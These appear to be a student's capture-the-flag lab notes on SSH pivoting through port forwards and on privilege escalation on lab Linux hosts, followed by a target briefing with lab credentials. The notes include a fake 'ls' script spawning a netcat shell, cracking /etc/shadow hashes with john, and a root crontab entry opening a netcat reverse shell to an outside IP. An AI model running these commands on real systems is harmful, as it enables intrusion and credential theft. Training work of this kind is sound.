student@lin-ops:~$ ssh -MS /tmp/gray student@10.50.36.239
student@lin-ops:~$ ssh -S /tmp/gray gray -O forward -L 1470:192.168.28.105:2222
student@lin-ops:~$ ssh -MS /tmp/orange comrade@0.0.0.0 -p 1470
student@lin-ops:~$ ssh -S /tmp/orange orange -O forward -L 1473:192.168.28.27:22
student@lin-ops:~$ ssh comrade@localhost -p 1473
comrade@lin2
student@lin-ops:~$ ssh -S /tmp/orange orange -O forward -L 1474:192.168.28.12:22
student@lin-ops:~$ ssh comrade@localhost -p 1474
comrade@lin1



On COMRADE@LIN2
make a script called ls
#!/bin/bash
nc 127.0.0.1 5555 -e /bin/bash
nc -lvp 5555
now being run as billybob
ls -la /home
see flag and a word list
cat /etc/shadow
john --wordlist=<wordlist file> <file w hashes, delete users w/ out hashes>
# ghjcnbnenrf      (zeus)
log in as zeus 
find flag in root directory
vim /etc/crontab
* *     * * *   root    nc 192.168.28.135 33403 -e /bin/bash
runs every minute
check tmp directory for flag










Target Section:

Pivot
Hostname: Donovian-Terminal
IP: 192.168.28.105
OS: Ubuntu 18.04
Creds: comrade :: StudentReconPassword
Last Known SSH Port: 2222
PSP: rkhunter
Malware: none
Action: Perform SSH masquerade and redirect to the next target. No survey required, cohabitation with known PSP approved.

T1
Hostname: unknown
IP: 192.168.28.27
OS: Linux ver: Unknown
Creds: comrade :: StudentPrivPassword
Last Known Ports: unknown
PSP: unknown
Malware: unknown
Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.

T2
Hostname: unknown
IP: 192.168.28.12
OS: Linux ver: Unknown
Creds: comrade :: StudentPrivPassword
Last Known Ports: unknown
PSP: unknown
Malware: unknown
Action: Test supplied credentials, if possible gain access to host. Conduct host survey and gain privileged access.
